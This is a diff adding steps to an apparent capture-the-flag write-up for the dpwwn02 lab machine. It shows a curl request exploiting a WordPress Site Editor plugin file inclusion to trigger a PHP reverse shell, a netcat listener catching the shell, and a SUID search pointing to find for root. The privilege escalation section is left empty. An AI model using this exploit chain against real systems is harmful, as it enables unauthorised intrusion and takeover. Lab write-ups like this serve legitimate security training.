@@ -164,3 +164,63 @@ touch shell.php
 # use pentest monkey php reverse shell
 ```
 
+## 2.Gaining Shell
+
+Now just send this request :
+
+```bash
+root@kali: curl http://10.10.10.10/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/home/dpwwn02/shell.php
+```
+
+```bash
+root@kali: nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.10.10.11] from (UNKNOWN) [10.10.10.10] 54886
+Linux dpwwn-02 5.0.0-23-generic #24-Ubuntu SMP Mon Jul 29 15:36:44 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 11:34:07 up  1:36,  0 users,  load average: 0.02, 0.06, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data
+```
+
+we just check for SUID binaries on the system:
+
+```bash
+$ find / -user root -perm /4000 2>/dev/null
+/usr/bin/fusermount
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/umount
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/gpasswd
+...
+```
+
+we see find here and can use it to get root account
+
+
+## 3.Privilege Escalation
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
